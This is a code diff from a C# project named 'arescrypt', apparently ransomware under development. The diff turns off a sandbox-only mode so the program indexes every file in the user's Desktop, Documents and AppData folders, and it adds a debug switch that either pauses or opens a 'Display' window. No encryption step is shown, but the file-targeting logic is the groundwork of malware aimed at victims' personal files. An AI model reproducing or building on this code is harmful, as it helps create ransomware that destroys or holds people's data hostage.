@@ -11,7 +11,8 @@ namespace arescrypt
         // Predefinitions
         public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
         public static string sessionUsername = Environment.UserName; // get current sessions username
-        
+        static Configuration config = new Configuration(); // New instance of Configuration class
+
         static void Main(string[] args)
         {
             // Welcome message
@@ -28,14 +29,14 @@ namespace arescrypt
             var systemSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
 
-            if (Configuration.sandBox) // == true
-                if (Directory.Exists(Configuration.sandBoxDirectory))
-                    userSpecificDirs.Add(Configuration.sandBoxDirectory);
+            if (config.sandBox) // == true
+                if (Directory.Exists(config.sandBoxDirectory))
+                    userSpecificDirs.Add(config.sandBoxDirectory);
                 else
-                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + Configuration.sandBoxDirectory);
-            else if (!Configuration.sandBox)
+                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + config.sandBoxDirectory);
+            else if (!config.sandBox)
             {
-                /*
+                //*
                 // User specific directories, administrative rights shouldn't be required in order to write to these files
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
@@ -44,10 +45,10 @@ namespace arescrypt
                 userSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
 
                 // System specific directories, administrative rights may be required in order to write to these files
-                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
-                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
-                systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
-                */
+                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
+                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
+                //systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
+                //*/
             }
             
             var userSpecificFiles = new List<string> { };
@@ -56,9 +57,9 @@ namespace arescrypt
             foreach (string dir in userSpecificDirs)
                 foreach (string file in FileHandler.DirSearch(dir))
                     userSpecificFiles.Add(file);
-            if (Configuration.sandBox) // == true
+            if (config.sandBox) // == true
                 fullFileIndex = userSpecificFiles.ToArray();
-            else if (!Configuration.sandBox) // == false
+            else if (!config.sandBox) // == false
             {   // Get file index from both Lists' and spawn a Full File Index of all files in every subdirectory
                 foreach (string dir in systemSpecificDirs)
                     foreach (string file in FileHandler.DirSearch(dir))
@@ -68,15 +69,21 @@ namespace arescrypt
 
             foreach (string file in fullFileIndex)
                 Console.WriteLine(file);
+                        
+            if (config.debugMode) // == true
+            {
+                // Exiting message
+                Console.Write("\nPress any key to continue . . . ");
 
-            // Exiting message
-            // Console.Write("\nPress any key to continue . . . ");
-            
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new Display());
-            //try { Console.ReadKey(); } // Hang the console
-            //catch (Exception) { } // Because Mintty doesn't like to "ReadKeys"
+                try { Console.ReadKey(); } // Hang the console
+                catch (Exception) { } // Because Mintty doesn't like to "ReadKeys"
+            }
+            else if (!config.debugMode) // == false
+            {
+                Application.EnableVisualStyles();
+                Application.SetCompatibleTextRenderingDefault(false);
+                Application.Run(new Display());
+            }
         }
     }
 }
